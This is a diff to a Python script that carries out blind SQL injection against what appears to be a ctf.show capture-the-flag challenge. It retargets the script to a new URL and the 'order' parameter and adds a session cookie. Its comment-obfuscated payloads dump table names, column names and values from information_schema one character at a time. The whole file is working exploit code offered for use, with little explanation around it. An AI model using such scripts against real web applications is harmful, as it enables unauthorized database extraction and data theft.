@@ -1,7 +1,7 @@
 import requests
-
+# http://294be7b6-702f-4dcc-a967-e566c87099f3.challenge.ctf.show/user_main.php?order=5
 chars = "{}-0123456789abcdefghijklmnopqrstuvwxyz" # 待测试字符
-url = "http://c1504900-467b-493a-aaa7-b82afb859dd6.challenge.ctf.show/" # 爆破地址
+url = "http://294be7b6-702f-4dcc-a967-e566c87099f3.challenge.ctf.show/user_main.php" # 爆破地址
 
 # 爆破表数量
 hack_table_count = 2
@@ -10,15 +10,19 @@ hack_column_count = 1
 default_tableName_length = 10
 default_value_length = 50
 # 注入字段名
-hack_key = "id"
+hack_key = "order"
 # 空值作为传递的输入
 hack_null_value = "-1"
 # 筛选目标值
-hack_target = "If"
+hack_target = "flag_is_my_password"
 
-getTable = False
+getTable = True
 getColumn = False
-getValue = True
+getValue = False
+
+header = {
+   "Cookie" : "PHPSESSID=6afeeb2f5bb37563381e5597914fabf0",
+}
 
 if getTable == True:
     ### 获取数据表明
@@ -29,7 +33,7 @@ if getTable == True:
                 params = {
                     hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database())/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                 }
-                r = requests.get(url=url,params=params)
+                r = requests.get(url=url,params=params,headers=header)
                 if hack_target in r.text:
                     table_name += char
         print("result:::" + table_name)
@@ -46,7 +50,7 @@ if getColumn == True:
                 params = {
                     hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/("+table_name_hex+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                 }
-                r = requests.get(url=url,params=params)
+                r = requests.get(url=url,params=params,headers=header)
                 if hack_target in r.text:
                     column_name += char
         print("result:::" + column_name)
@@ -60,7 +64,7 @@ if getValue == True:
                 params = {
                     hack_key : hack_null_value + "/**/or/**/ord(mid((select/**/("+column_name+")/**/from/**/("+table_name+")/**/limit/**/1/**/offset/**/"+str(n)+")/**/from/**/"+str(i)+"/**/for/**/1))/**/in/**/("+str(ord(char))+")"
                 }
-                r = requests.get(url=url,params=params)
+                r = requests.get(url=url,params=params,headers=header)
                 if hack_target in r.text:
                     value += char
         print("result:::" + value)
